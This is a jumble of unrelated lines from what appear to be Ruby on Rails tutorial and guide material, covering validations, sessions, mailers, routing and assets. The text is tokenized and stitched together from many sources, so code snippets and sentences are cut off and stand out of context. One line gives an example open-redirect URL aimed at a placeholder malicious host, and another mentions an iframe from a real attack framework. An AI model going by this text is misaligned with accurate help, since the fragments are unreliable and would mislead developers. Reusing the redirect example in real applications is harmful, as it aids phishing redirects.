* `set _ load _ path` This initializer runs before `bootstrap _ hook` ▖
The ( rather subtle ) gear icon in the file navigator pane .
The initial \ kode { README } file for our project at GitHub ▖ ~ \ href { http : / / railstutorial ▖ org / images / figures / rails _ readme _ 4 _ 0-full ▖ png } { ( full size ) }
You can personalize these messages using the ` : wrong _ length` , ╼ ` : too _ long` , and ` : too _ short` options and ` % { count } ` as a placeholder for the ╼ number corresponding to the length constraint being used ▖
Extensions to All Objects
When the built-in validation helpers are not enough for your needs , you can ╼ write your own validators or validation methods as you prefer .
has _ many : line _ items , - &gt; { group &apos; orders ▖ id &apos; } ,
Most browsers display the contents of the title tag at the top of the browser window , and it is also important for search-engine optimization .
Creates a field set for grouping HTML form elements .
# # # # # `weeks _ ago`
Unobtrusive JavaScript
match &apos; / application ▖ js &apos; , to : Sprockets , via : : all
This is the technical meaning of ``everything in Ruby is an object &apos; &apos; .
{ &quot; title &quot; = &gt; &quot; First article ! &quot; , &quot; text &quot; = &gt; &quot; This is my first article ▖ &quot; }
megabytes
The signin form ( \ href { http : / / localhost : 3000 / signin } { / signin } ) ▖ ~ \ href { http : / / railstutorial ▖ org / images / figures / signin _ form _ bootstrap-full ▖ png } { ( full size ) }
This guide focuses on the interaction between Controller and View in the Model-View-Controller triangle ▖
&lt; ul &gt; &lt; li &gt; ` : address` - Allows you to use a remote mail server ▖
sample application .
It &apos;s convenient to model sessions as a RESTful resource : we &apos;ll have a signin page for \ emph { new } sessions , signing in will \ emph { create } a session , and signing out will \ emph { destroy } it .
( Yes , this can be confusing ▖ )
t ▖ text : description
# = &gt; Sun Mar 28 01 : 59 : 59 + 0100 2010
create app / views / blorgh / articles / new ▖ html ▖ erb
Open up a command line prompt ▖
The method `Array ▖ wrap` wraps its argument in an array unless it is already an array ( or array-like ) .
# # # Inside an Engine
class Appointment &lt; ActiveRecord : : Base
javascript _ include _ tag : all
First , in the case of the user / micropost association we could write
Rails comes with a script for making controllers called \ kode { generate } ; all it needs to work its magic is the controller &apos;s name .
A mockup of the sample application &apos;s Home page .
gem &apos; coffee-rails&apos;
Step definitions can replicate this functionality with regex matchers , but I generally find this approach to be more ( cu ) cumbersome .
start of regex
We will identify privileged administrative users with a boolean \ kode { admin } attribute in the User model , which , as we &apos;ll see , will automatically lead to an \ kode { admin ? } \ boolean method to test for admin status .
&gt; , &apos; 2009-008 &apos; = &gt; &lt; Invoice ▖ ▖ .
If you have a Rails template that adds all the files in version control , it ╼ fails to add the generated binstubs because it gets executed before Bundler :
has _ one : address
Adding lines to check for the appearance of error messages is left as an exercise ( Section ~ \ ref { sec : signup _ exercises } ) .
message ▖ to = &#91; &apos; sandbox @ example ▖ com &apos; &#93;
* How to understand the various types of Active Record associations .
Active Job supports GlobalID for parameters ▖
# Create the token .
has _ many : line _ items , inverse _ of : : order
We start by generating an integration test for our application &apos;s login behavior :
Note that , unlike the default generated Relationship model , in this case only the \ kode { followed \ _ id } is accessible .
subject : &quot; Already rendered ! &quot; )
def new _ registration ( user )
XML _ TYPE _ NAMES = {
# ▖ ▖ .
* `config ▖ middleware ▖ insert _ after ( existing _ middleware , new _ middleware , args ) ` - Adds the new middleware after the specified existing middleware in the middleware stack .
we have
technical sophistication
&lt; nav &gt;
Undoing the generation means removing not only the principal generated file , but all the ancillary files as well .
In Ruby , they are optional , so these two are equivalent :
This section is optional and can be skipped without loss of continuity .
With the code in this section , the user edit page should be working ( Figure ~ \ ref { fig : edit _ form _ working } ) , as you can double-check by re-running the test suite , which should now be \ passing :
The first method , \ kode { initialize } , is special in Ruby : it &apos;s the method called when we execute \ kode { User ▖ new } .
It &apos;s helpful in this context to define a \ kode { is \ _ logged \ _ in ? } \ helper method to parallel the \ kode { logged \ _ in ? } \ helper defined in Listing ~ \ ref { code : logged _ in _ p } , which returns \ kode { true } if there &apos;s a user id in the ( test ) session and false otherwise ( Listing ~ \ ref { code : test _ helper _ sessions } ) .
We &apos;ll be implementing all three of the most common models for login / logout behavior on the web : ``forgetting &apos; &apos; users on browser close ( Section ~ \ ref { sec : sessions _ and _ failed _ login } and Section ~ \ ref { sec : logging _ in } ) , \ emph { automatically } remembering users ( Section ~ \ ref { sec : remember _ me } ) , and \ emph { optionally } remembering users based on the value of a ``remember me &apos; &apos; checkbox ( Section ~ \ ref { sec : remember _ me _ checkbox } )
&lt; p &gt;
The result appears in Listing ~ \ ref { code : stylesheets _ partial }
However , if combined with ╼ other techniques , client-side validation can be a convenient way to provide ╼ users with immediate feedback as they use your site .
One nice effect of building the authentication machinery in Chapter ~ \ ref { cha : log _ in _ log _ out } is that we are now in a position to implement authorization as well .
Integration tests , known as \ emph { request specs } in the context of RSpec , allow us to simulate the actions of a user interacting with our application using a web browser .
xml ▖ description ( item _ description ( item ) ) if item _ description ( item )
Before we wrote \ kode { remember user } without parentheses , but when used with the ternary operator omitting them results in a syntax error .
We &apos;ve used \ kode { let } in a couple of exercises , but this is the first time we &apos;ve seen it in the body of the tutorial .
Happily , Rails comes with a command-line program , or \ emph { script } , that runs a \ emph { local } web server , visible only from your development machine
# = &gt; Tue , 06 Sep 2011 12 : 34 : 32 + 0000
I recommend updating your \ kode { ▖ gitignore } file as shown in Listing ~ \ ref { code : gitignore _ uploads } so that the image uploads directory is ignored .
length : 30 , omission : &quot; ▖ ▖ ▖ &quot; )
$ rm -rf tmp /
Applying this idea to the relationships fixtures gives the associations in Listing ~ \ ref { code : relationships _ fixtures } .
By doing this , Rails is informed that the ╼ directory for this gem may contain assets and the `app / assets` , `lib / assets` and ╼ `vendor / assets` directories of this engine are added to the search path of ╼ Sprockets .
% &gt; ╼ ╼ &lt; % = f ▖ label : password % &gt; ╼ &lt; % = f ▖ password _ field : password , class : &apos; form-control &apos; % &gt; ╼ ╼ &lt; % = f ▖ label : password _ confirmation , &quot; Confirmation &quot; % &gt; ╼ &lt; % = f ▖ password _ field : password _ confirmation , class : &apos; form-control &apos; % &gt; ╼ ╼ &lt; % = f ▖ submit &quot; Create my account &quot; , class : &quot; btn btn-primary &quot; % &gt; ╼ &lt; % end % &gt; ╼ &lt; / div &gt; ╼ &lt; / div &gt; ╼ \ end { code } ╼ \ end { codelisting } ╼ ╼ % subsection a _ test _ for _ invalid _ submission ( end ) ╼ ╼ % section unsuccessful _ signups ( end ) ╼ ╼ \ section { Successful signups } % ( fold ) ╼ \ label { sec : successful _ signups } ╼ ╼
Since the condition in Listing ~ \ ref { code : from _ users _ followed _ by _ first _ cut } actually just checks inclusion in a set , there must be a more efficient way to do this , and indeed SQL is optimized for just such set operations .
╼ \ end { aside } ╼ ╼ \ section { User model } % ( fold ) ╼ \ label { sec : user _ model } ╼ ╼
Adding `offset` to that
For a more advanced way to create the necessary subselect , see the blog post \ href { http : / / pivotallabs ▖ com / users / jsusser / blog / articles / 567-hacking-a-subselect-in-activerecord } { ``Hacking a subselect in ActiveRecord &apos; &apos; ▖ }
How do you know which is which ?
In particular , it ensures that a \ texttt { POST } request to / users is handled by the \ kode { create } action .
As with the \ kode { header } tag &apos;s classes , this class has special meaning to Bootstrap .
In Section ~ \ ref { sec : activation _ test _ and _ refactoring } , we &apos;ll complete the process by adding some tests and then doing a little refactoring .
The remember token cookie in the local browser ▖ ~ \ href { http : / / railstutorial ▖ org / images / figures / cookie _ in _ browser-full ▖ png } { ( full size ) }
= &gt; &#91; &quot; 1 &quot; , &quot; 2 &quot; , &quot; 3 &quot; , &quot; 4 &quot; &#93;
Like `distance _ of _ time _ in _ words` , but where `to _ time` is fixed to `Time ▖ now` .
get &apos; : username &apos; , to : &apos; users # show &apos; , as : : user
Failed signup with error messages ▖ ~ \ href { http : / / railstutorial ▖ org / images / figures / signup _ error _ messages _ bootstrap-full ▖ png } { ( full size ) }
( The code in this file is Ruby , but don &apos;t worry at this point about the syntax ; Chapter ~ \ ref { cha : rails _ flavored _ ruby } will cover Ruby in more depth ▖ )
A user has many microposts .
When run the next time , it will only copy over migrations that ╼ haven &apos;t been copied over already ▖
* Strict-Transport-Security
( Figure ~ \ ref { fig : signup _ failure _ 3rd _ edition } also shows the \ emph { web console } , which opens a Rails console in the browser to assist in debugging .
class Magazine &lt; ActiveRecord : : Base
BigDecimal ▖ new ( 5 ▖ 00 , 6 ) ▖ to _ formatted _ s ( : db ) # = &gt; &quot; 5 ▖ 0 &quot;
You don &apos;t need to see the details of these sections when you &apos;re concentrating on a particular page .
The \ kode { rake db : migrate } command is probably the most common , but there are many others ; you can see a list of database tasks using \ kode { -T db } :
The paginated users index is now complete , but there &apos;s one improvement I can &apos;t resist including : Rails has some incredibly slick tools for making compact views , and in this section we &apos;ll refactor the index page to use them .
Because of the \ kode { navbar-fixed-top } class in the \ kode { header } tag , Bootstrap fixes the navigation bar to the top of the page , so the padding serves to separate the main text from the navigation .
Rather than changing Rakefile , you should add your own tasks by adding files to the lib / tasks directory of your application .
x = x + 1
Comparing Listing ~ \ ref { code : signup _ form } with Listing ~ \ ref { code : signup _ form _ html } , we see that the embedded Ruby
A user profile with an unfollow button ( \ href { http : / / 0 ▖ 0 ▖ 0 ▖ 0 : 3000 / users / 5 } { / users / 5 } ) .
You may recall the console example in Section ~ \ ref { sec : hashes _ and _ symbols } , where we saw how to iterate through a hash using the strategically named \ kode { flash } variable :
Similarly , in Chapter ~ \ ref { cha : modeling _ users } we &apos;ll generate a \ emph { model } as follows :
With invalid information , the update attempt returns \ kode { false } , so the \ kode { else } branch re-renders the edit page .
For example ,
is an \ emph { assignment } , which we must define .
For example , the command I ran was
If we instead authenticate with the correct password , \ kode { authenticate } returns the user itself :
* `config ▖ force _ ssl` forces all requests to be under HTTPS protocol by using `ActionDispatch : : SSL` middleware .
( Listing ~ \ ref { code : full _ title _ helper _ tests } uses \ kode { assert \ _ equal &lt; expected &gt; , &lt; actual &gt; } , which verifies that the expected result \ linebreak matches the actual value when compared with the \ kode { = = } operator ▖ )
This is the home page for the
As Sprockets uses &#91; Tilt &#93; ( https : / / github ▖ com / rtomayko / tilt ) as a generic ╼ interface to different templating engines , your gem should just implement the ╼ Tilt template protocol ▖
( Defining methods in the console is a bit cumbersome , and ordinarily you would use a file , but it &apos;s convenient for demonstration purposes ▖ )
We &apos;ll add some ( very slightly ) dynamic content starting in Section ~ \ ref { sec : slightly _ dynamic _ pages } , but as they stand the views in Listing ~ \ ref { code : raw _ home _ view } and Listing ~ \ ref { code : raw _ help _ view } underscore an important point : Rails views can simply contain static HTML ▖ This means we can begin customizing the Home and Help pages even with no knowledge of Rails , as shown in Listing ~ \ ref { code : custom _ home _ page } and Listing ~ \ ref { code : custom _ help _ page } .
When included in a model as above , this one method adds the following functionality :
customer ▖ orders ( true ) ▖ empty ?
# # # # Internal Attributes
users ▖ each { &#124; user &#124; Notifier ▖ notify ( user , ▖ ▖ ▖ )
umerate } ╼ ╼ % subsection requiring _ logged _ in _ users ( end ) ╼ ╼ \ subsection { Requiring the right user } % ( fold ) ╼ \ label { sec : requiring _ the _ right _ user } ╼ ╼
Defaults to ` &apos; signed encrypted cookie &apos; ` .
The StaticPages controller spec with title tests .
Commit
Let &apos;s get started by reviewing the code for the signup form :
bundle exec rake rdoc
* `config ▖ action _ mailer ▖ perform _ deliveries` specifies whether mail will actually be delivered and is true by default ▖
Using / Users / mhartl / ▖ rvm / gems / ruby-2 ▖ 0 ▖ 0-p0 with gemset railstutorial _ rails _ 4 _ 0
&quot; hello &quot; ▖ at ( 10 ) # = &gt; nil
Hash values can be virtually anything , even other hashes , as seen in Listing ~ \ ref { code : nested _ hashes } .
* `headers` - Specifies any header on the email you want ▖
invoke rspec
The \ kode { generate } command produces a migration to create a \ kode { microposts } table in the database ( Listing ~ \ ref { code : micropost _ migration } ) ; compare it to the analogous migration for the \ kode { users } table from Listing ~ \ ref { code : users _ migration } .
# # # # # `where`
sign-up
Among other things , adding this feature requires learning how to send mail with Rails .
For example , given
gigabytes
Pretty underwhelming , you say ?
As with any refactoring , you should verify that the test suite is still green after changing the application code :
In particular , in the Activations controller \ kode { edit } action , the token will be available in the \ kode { params } hash as \ kode { params &#91; : id &#93; } .
Ruby has built-in support for taking slices out of strings and arrays ▖
The \ kode { will \ _ paginate } method is a little magical ; inside a \ kode { users } view , it automatically looks for an \ kode { @ users } object , and then displays pagination links to access other pages .
By issuing a \ texttt { PATCH } request directly to the \ kode { update } method as shown in Listing ~ \ ref { code : forbidden _ admin _ test } , verify that the \ kode { admin } attribute isn &apos;t editable through the web .
Tests for the Micropost model validations ▖
With this code , Active Record automatically returns all the microposts with \ kode { user \ _ id } equal to the id of \ kode { first \ _ user } ( in this case , ~ \ kode { 1 } ) .
It &apos;s also worth noting that we could actually omit the \ kode { : source } key in this case , using simply
Note that nothing in the above code uses the current user , so the same links work for other users , as shown in Figure ~ \ ref { fig : different _ user _ followers } .
We can see how this works using the console :
Instead , setting `config ▖ assets ▖ css _ compressor` and ╼ `config ▖ assets ▖ js _ compressor` will control compression of CSS and JavaScript ╼ assets .
* `config ▖ assets ▖ cache _ store` defines the cache store that Sprockets will use ▖
render &quot; index &quot;
authors = Author ▖ where ( name : &apos; Hank Moody &apos; ) ▖ to _ a
Examining Listing ~ \ ref { code : toy _ application _ controller _ class } , we see that \ kode { ApplicationController } itself inherits from \ kode { ActionController : : Base } ; this is the base class for controllers provided by the Rails library Action Pack .
The method also accepts options like ` : dasherize` and friends , they are forwarded to the builder :
As a first application of the MVC framework , we &apos;ll make a \ href { http : / / en ▖ wikipedia ▖ org / wiki / Mr _ Creosote } { wafer-thin } change to the first app by adding a \ emph { controller action } to render the string ``hello , world ! &apos; &apos; .
def process _ with _ stringified _ params ( ▖ ▖ ▖ )
* In Rails 4 ▖ 0 , `ActionController : : UnknownFormat` is raised when the action doesn &apos;t handle the request format ▖
To preserve the current default , add the following ╼ line to your `production ▖ rb` :
# Make sure your secret _ key _ base is kept private
NOTE : Defined in `active _ support / core _ ext / regexp ▖ rb` .
( In the full third edition of the \ emph { Rails Tutorial } , I plan to eliminate this requirement by adopting the newer technique of \ href { https : / / www ▖ relishapp ▖ com / rspec / rspec-rails / docs / feature-specs / feature-spec } { feature specs } ▖ )
With the code as in Listing ~ \ ref { code : persistent _ current _ user } , newly logged in users are correctly remembered , as you can verify by logging in , closing the browser , and checking that you &apos;re still logged in when you restart the sample application and revisit the sample application .
We next install the gems by running \ kode { bundle install } :
kilobytes
$ git checkout 4-0-stable
To fix the problem , just hit return again ▖ )
config ▖ middleware ▖ insert _ before ( Rack : : Lock , ActionDispatch : : BestStandardsSupport )
The resulting \ kode { user ▖ forget } method just undoes \ kode { user ▖ remember } by updating the remember digest with \ kode { nil } , as shown in Listing ~ \ ref { code : user _ model _ forget } .
The \ kode { has \ _ many } / \ kode { belongs \ _ to } combination gives rise to methods that work through the association .
@ number ▖ try ( : next )
as seen in Listing ~ \ ref { code : new _ action _ with _ user } .
def name
╼ ╼ \ subsection { Arrays and ranges } % ( fold ) ╼ \ label { sec : arrays _ and _ ranges } ╼ ╼
Having finished the foundation of the sample application &apos;s authentication system , we &apos;re going to take this opportunity to show how to write signin tests using \ href { http : / / cukes ▖ info } { Cucumber } , a popular tool for behavior-driven development that enjoys significant popularity in the Ruby community .
If you are unsure of the documentation changes , you can create an issue in the &#91; Rails &#93; ( https : / / github ▖ com / rails / rails / issues ) issues tracker on GitHub .
For example , let &apos;s say your asset host is `assets ▖ example ▖ com` :
Note that we don &apos;t need to add a view for this ╼ action since we &apos;re redirecting to the `index` action .
invoke assets
instead of
&lt; % sample ▖ in _ groups _ of ( 3 ) do &#124; a , b , c &#124; % &gt;
Later in this guide you &apos;ll find detailed instructions for proposing a patch to ╼ Ruby on Rails ▖
class _ name : &quot; MyApplication : : Business : : Supplier &quot;
* `photo _ path ( : id ) ` returns ` / photos / : id` ( for instance , `photo _ path ( 10 ) ` returns ` / photos / 10` )
Rails 3 ▖ 2 deprecates `vendor / plugins` and Rails 4 ▖ 0 will remove them completely ▖
This method is an alias of `Array # &lt; &lt; ` .
With the code in Listing ~ \ ref { code : sessions _ helper _ authenticate } , the \ kode { logged \ _ in \ _ user } method is now available in the Microposts controller , which means that we can add \ kode { create } and \ kode { destroy } actions and then restrict access to them using a before filter , as shown in Listing ~ \ ref { code : microposts _ controller _ access _ control } .
def perform ( trashable _ class , trashable _ id , depth )
Client ▖ sum ( &quot; orders _ count &quot; )
The rest of this guide ╼ will show you how Rails can help you write websites in this way , but it &apos;s ╼ all built on top of this fairly simple technique .
error
If &quot; SSL &quot; was defined to be an acronym :
If this asset isn &apos;t namespaced , there is a ╼ possibility that the host application could have an asset named identically , in ╼ which case the application &apos;s asset would take precedence and the engine &apos;s one ╼ would be ignored .
# = &gt; Fri , 01 Jan 2010 00 : 00 : 00 UTC + 00 : 00 ▖ .
# Your secret key is used for verifying the integrity of signed cookies .
Client ▖ order ( &quot; orders _ count ASC , created _ at DESC &quot; )
Useful when CDNs are used for hosting assets rather than the application server itself .
Mailers are very similar to Rails controllers ▖
By default , methods defined in any helper file are automatically available in any view , but for convenience we &apos;ll put the \ kode { gravatar \ _ for } method in the file for helpers associated with the Users controller .
In addition , many readers have reported benefiting from going through it a second time .
Whether a changing title represents \ emph { truly } dynamic content is debatable , but in any case it lays the necessary foundation for unambiguously dynamic content in Chapter ~ \ ref { cha : sign _ up } .
* Update the ( surrounding ) documentation , examples elsewhere , and the guides : whatever is affected by your contribution .
Method Visibility
# Make sure the secret is at least 30 characters and all random ,
( Compare to the integration test for ``delete &apos; &apos; links in Listing ~ \ ref { code : delete _ link _ integration _ test } ▖ )
We see from Table ~ \ ref { table : user _ and _ and } that the \ kode { if } statement is \ kode { true } only if a user with the given email both exists in the database and has the given password , exactly as required .
WARNING : Since in this case the name of the generated method is composed of the target object and target method names , the ` : to` option must be a method name .
&#124; `default _ options` &#124; Allows you to set default values for the `mail` method options ( ` : from` , ` : reply _ to` , etc ▖ ) .
Migrations are stored in files which are executed against any ╼ database that Active Record supports using `rake` ▖
* ` : dependent`
{ &quot; a &quot; = &gt; 1 , a : 2 } ▖ stringify _ keys
ActiveSupport ▖ on _ load ( : action _ controller ) do
The code in Listing ~ \ ref { code : user _ index _ view } uses the result of Listing ~ \ ref { code : gravatar _ option } from Section ~ \ ref { sec : signup _ exercises } , which allows us to pass an option to the Gravatar helper specifying a size other than the default .
If you have a field called `first _ name` on your `Client` model for example , you get `find _ by _ first _ name` for free from Active Record ▖
in Listing ~ \ ref { code : token _ method } .
# # # # `all _ day` , `all _ week` , `all _ month` , `all _ quarter` and `all _ year`
The sample application site layout ▖
The generated User mailer previews .
Showing a different user &apos;s followers .
Remembering users involves creating a remember token and saving the digest of the token to the database .
$ ( &apos; # logo &apos; ) ▖ attr ( { src : &quot; &lt; % = asset _ path ( &apos; logo ▖ png &apos; ) % &gt; &quot; } ) ;
{ &quot; a &quot; = &gt; 1 , a : 2 } ▖ transform _ keys { &#124; key &#124; key ▖ to _ s ▖ upcase }
A micropost \ kode { belongs \ _ to } a user ▖
To get pagination working , we need to add some code to the index view telling Rails to paginate the users , and we need to replace \ kode { User ▖ all } in the \ kode { index } action with an object that knows about pagination .
For example , we can use strings as keys :
The login form after trying to access a protected page .
in Listing ~ \ ref { code : user _ logout _ test } .
╼ ╼ If you &apos;ve found a problem in Ruby on Rails which is not a security risk , do a search in GitHub under &#91; Issues &#93; ( https : / / github ▖ com / rails / rails / issues ) in case it has already been reported ▖ If you do not find any issue addressing it you may proceed to &#91; open a new one &#93; ( https : / / github ▖ com / rails / rails / issues / new ) ▖
Upgrading from Rails 4 ▖ 0 to Rails 4 ▖ 1
The application mailer with a new default \ kode { from } address .
`beginning _ of _ week` is aliased to `at _ beginning _ of _ week` and `end _ of _ week` is aliased to `at _ end _ of _ week` .
This line mounts the engine at the path ` / blorgh` , which will make it accessible ╼ through the application only at that path .
We can add it to our app as follows :
Validating the presence of a \ kode { name } attribute ▖
Do it from start to finish , without jumping around , and you &apos;ll get the ultimate benefit .
TIP : If you &apos;re running Rails on Microsoft Windows , you should use the ` : file` option to ╼ render a file , because Windows filenames do not have the same format as Unix filenames .
However , this only seems to work with Keep-Alive connections ( and many browsers are using one-time connections ) ▖
There , our select was very simple ; we just picked out all the microposts with user id corresponding to the current user :
# # # # time _ zone _ options _ for _ select
{ a : 1 , b : 2 , c : 3 } ▖ slice ( : b , : X )
╼ # ╼ # If you find yourself ignoring temporary files generated by your text editor ╼ # or operating system , you probably want to add a global ignore instead : ╼ # git config --global core ▖ excludesfile &apos; ~ / ▖ gitignore _ global &apos; ╼ ╼ # Ignore bundler config .
will now trigger CSRF protection ▖
The \ kode { store \ _ location } method in Listing ~ \ ref { code : friendly _ forwarding _ code } puts the requested URL in the \ kode { session } variable under the key \ kode { : forwarding \ _ url } , but only for a \ kode { GET } request .
In fact , \ kode { sudo } is a concatenation of the \ kode { su } command and the English word ``do &apos; &apos; , and \ kode { su } stands for ``substitute user &apos; &apos; , as you can verify by typing \ kode { man su } in your shell .
The last item will win .
create app / assets / javascripts / blorgh / articles ▖ js
right password
The rest of the book is dedicated to fleshing out the sample application : first , by adding users who can sign up , log in , and log out ; next , by adding user microposts ; and , finally , by adding the ability to follow other users .
* The `development` environment is used on your development / local computer as you interact manually with the application .
helper module _ path
X-Cache-Hits :
Category ▖ joins ( articles : &#91; { comments : : guest } , : tags &#93; )
SELECT * FROM articles WHERE id &gt; 10 LIMIT 20
The Micropost model validations ▖
resources : photos
if email ▖ has _ attachments ?
This can be accomplished with \ kode { rails generate rspec : install } :
One thing we notice is that all three examples include a visit to the root path .
This pattern of setting a cookie that expires 20 years in the future is so common that Rails has a special \ kode { permanent } method to implement it , so that we can simply write
The JavaScript Embedded Ruby to create a following relationship .
Another common Ruby pattern is assigning to a variable if it &apos;s \ texttt { nil } but otherwise leaving it alone .
&#124; &#124; 414 &#124; : request _ uri _ too _ long &#124;
&#91; &#93; ▖ sum ( 1 ) # = &gt; 1
* ` : address` - Allows you to use a remote mail server ▖
as shown in Listing ~ \ ref { code : downcase _ bang } .
&#124; ---------------------- &#124; ----------------------------------- &#124;
It is an ╼ implementation of the Active Record pattern which itself is a description of an ╼ Object Relational Mapping system .
create app / views / users / new ▖ html ▖ erb
You can see what the engine has so far by running `rake db : migrate` at the root ╼ of our engine to run the migration generated by the scaffold generator , and then ╼ running `rails server` in `test / dummy` ▖
&lt; % = link _ to &apos; New article &apos; , new _ article _ path % &gt;
= = CreateMicroposts : migrating = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = =
The profile of a different user , also with microposts ( \ href { http : / / localhost : 3000 / users / 5 } { / users / 5 } ) .
Modifying built-in classes is a powerful technique , but with great power comes great responsibility , and it &apos;s considered bad form to add methods to built-in classes without having a \ emph { really } good reason for doing so .
# # # # Partial Layouts
articles GET / articles ( ▖ : format ) articles # index
mail ( subject : &quot; New User Signup : # { @ user ▖ email } &quot; )
Defaults to true .
= &gt; { : success = &gt; &quot; It worked ! &quot; , : error = &gt; &quot; It failed ▖ &quot; }
Ruby console for yourapp ▖ herokuapp ▖ com
Because `Rails : : Application` inherits from `Rails : : Railtie` ( indirectly ) , you can use the `initializer` method in `config / application ▖ rb` to define initializers for the application .
stylesheet _ path &quot; application &quot; # = &gt; / assets / application ▖ css
At the end of this tutorial , no matter where you started , you should be ready for the many more intermediate-to-advanced Rails resources out there .
Now it &apos;s time to use ╼ it within an application .
# def self ▖ find _ by _ login _ and _ activated ( * args )
( If you &apos;re using the cloud IDE as recommended in Section ~ \ ref { sec : development _ environment } , note that this second app can be created in the same workspace as the first .
It &apos;s common that you need to find a record or create it if it doesn &apos;t exist ▖
If it does , a warning is issued if they are enabled ▖
Similarly , the code
In the \ emph { Rails Tutorial } we &apos;ll follow the common convention of using curly braces only for short one-line blocks and the \ kode { do ▖ ▖ end } syntax for longer one-liners and for multi-line blocks :
Click on the link below to activate your account : ╼ &lt; / p &gt; ╼ ╼ &lt; a href = &quot; http : / / rails-tutorial-c9-mhartl ▖ c9 ▖ io / account _ activations / ╼ fFb _ F94mgQtmlSvRFGsITw / edit ?
You can then get Ruby set up by examining the requirements for installing it :
Heroku recommends against using different databases in development and production , but for the sample application it won &apos;t make any difference , and SQLite is \ emph { much } easier than PostgreSQL to install and configure .
WARNING : Docrails has a very strict policy : no code can be touched whatsoever , no matter how trivial or small the change ▖
Remembering the user .
NOTE : If there are missing precompiled files in production you will get an ╼ `Sprockets : : Helpers : : RailsHelper : : AssetPaths : : AssetNotPrecompiledError` ╼ exception indicating the name of the missing file ( s ) .
&lt; head &gt;
installs the gem \ kode { coffee-rails } ( also needed by the asset pipeline ) as long as it &apos;s newer than version ~ \ kode { 4 ▖ 0 ▖ 0 } but not newer than \ kode { 4 ▖ 1 } .
# # # # # Defacement
Because temporary cookies created using the \ kode { session } method are automatically encrypted , the code in Listing ~ \ ref { code : log _ in _ function } is secure , and there is no way for an attacker to use the session information to log in as the user .
# # # # Adding Routes for Additional New Actions
That &apos;s it !
= &gt; &quot; 2013-03-11 01 : 37 : 32 &quot;
use Rack : : ETag
This is the most commonly used option .
# or operating system , you probably want to add a global ignore instead :
( If you get an error related to Spring , just run the command again ▖ )
One of the necessary aspects of the Micropost model is the presence of a user id to indicate which user made the micropost .
* `save !
Useful for configuring values set up by other initializers :
As a result , WEBrick \ href { https : / / devcenter ▖ heroku ▖ com / articles / ruby-default-web-server } { isn &apos;t suitable for production use } , so we &apos;ll \ href { https : / / devcenter ▖ heroku ▖ com / articles / deploying-rails-applications-with-the-puma-web-server } { replace WEBrick with Puma } , an HTTP server that is capable of handling a large number of incoming requests .
# # # Manifest Files and Directives
* Responsible for logging exceptions and showing a debugging page in case the request is local .
Since we can &apos;t allow just any user to have such dangerous powers , we &apos;ll take care to create a privileged class of administrative users ( admins ) authorized to delete other users .
( In fact , as you can see by visiting it , the \ href { http : / / www ▖ example ▖ com / } { example ▖ com } domain is reserved for examples like this one ▖ )
&quot; hello &quot; ▖ to ( -2 ) # = &gt; &quot; hell &quot;
# # # Association Callbacks
For example a CSS file `global ▖ css`
It also creates ╼ two timestamp fields to allow Rails to track article creation and update times .
Active Record uses this method to compute the default table name that corresponds to a model :
NOTE : Defined in `active _ support / core _ ext / file / atomic ▖ rb` .
sample application .
self ▖ table _ name _ prefix = &quot; &quot;
Sprockets concatenates all JavaScript files into one master ` ▖ js` file and all ╼ CSS files into one master ` ▖ css` file ▖
The new feature should create users in an inactive state , email the user an activation URL , and then change the user to an active state when the URL gets hit .
WARNING : The `find` method will raise an `ActiveRecord : : RecordNotFound` exception unless a matching record is found for * * all * * of the supplied primary keys .
&lt; % = link _ to &apos; Destroy Comment &apos; , &#91; comment ▖ article , comment &#93; ,
Tests for the user edit page .
Suppose ╼ that the `products` table was created using an SQL sentence like :
We &apos;ve constrained our User model to require a name for each user , but we should go further : the user &apos;s names will be displayed on the sample site , so we should enforce some limit on their length .
http : / / www ▖ yourapplication ▖ com / controller / action ? referer = http : / / www ▖ malicious ▖ tld
This helper validates that the attributes &apos; values are included in a given set .
╼ ╼ \ section { Account activations resource } % ( fold ) ╼ \ label { sec : account _ activations _ resource } ╼ ╼
def visible _ articles
render layout : &quot; special _ layout &quot;
We can also define helper functions for common operations :
As with the Sessions controller , the \ kode { log \ _ in } method is available in the Users controller because of the module inclusion in Listing ~ \ ref { code : sessions _ helper _ include } .
A well-configured testing environment with Guard , Spork , and ( optionally ) test notifications makes test-driven development positively addictive .
Images uploaded with CarrierWave should be associated with a corresponding attribute in an Active Record model , which simply contains the name of the image file in a string field .
The second main way to update attributes is to use \ kode { update \ _ attributes } :
The first thing a malicious user would do , is this :
It can be generated using this command inside the ╼ application :
Now that we have a fresh and working Rails application , we &apos;ll take a moment for a step that , while technically optional , would be viewed by many Rails developers as practically essential , namely , placing our application source code under \ emph { version control } .
* What Action View is and how to use it with Rails .
It doesn &apos;t have a predefined ╼ validation function ▖
Non-Resourceful Routes
TIP : You don &apos;t have to update the database configurations manually ▖
Even if you don &apos;t feel up to writing code or documentation yet , there are a variety of other ways that you can contribute , from reporting issues to testing patches .
Luckily , \ kode { cookies } \ emph { does } work with string keys , so that
n &gt; ╼ \ end { enumerate } ╼ ╼ % subsection access _ control ( end ) ╼ ╼ \ subsection { Creating microposts } % ( fold ) ╼ \ label { sec : creating _ microposts } ╼ ╼
Must conform to `ActiveSupport : : FileUpdateChecker` API .
Having written a failing test , we can now be confident that , in getting it to pass , we will actually have created a working About page .
&lt; p &gt; Hello , Rails !
This iframe is taken from an actual attack on legitimate Italian sites using the &#91; Mpack attack framework &#93; ( http : / / isc ▖ sans ▖ org / diary ▖ html ? storyid = 3015 ) ▖
&lt; p &gt; Here are a few of our fine products : &lt; / p &gt;
The following values are considered to be blank in a Rails application :
resources : comments do
&#91; { a : 1 , b : 2 } , { c : 3 } &#93; ▖ to _ xml
option _ groups _ from _ collection _ for _ select ( @ continents , : countries , : name , : id , : name , 3 )
The initial ( stub ) signup page .
gem &apos; blorgh &apos; , path : &quot; / path / to / blorgh &quot;
As a result of having less baggage , symbols are easier to compare to each other ; strings need to be compared character by character , while symbols can be compared all in one go .
This will render a file named ` _ menu ▖ html ▖ erb` at that point within the view that is being rendered ▖
We see from the console output above that the user has id ~ \ kode { 1 } , and our goal now is to make a page to display this user &apos;s information .
Pending :
QualifiedConstUtils ▖ raise _ if _ absolute ( path )
But it could be the case that the helper module does exist and in turn requires another library that is missing ▖
&quot; InvoiceLine &quot; ▖ foreign _ key # = &gt; &quot; invoice _ line _ id &quot;
Using strong parameters in the \ kode { create } action .
Use fixed-width fonts for :
So users dread software .
To add the required \ kode { picture } attribute to the Micropost model , we generate a migration and migrate the development database :
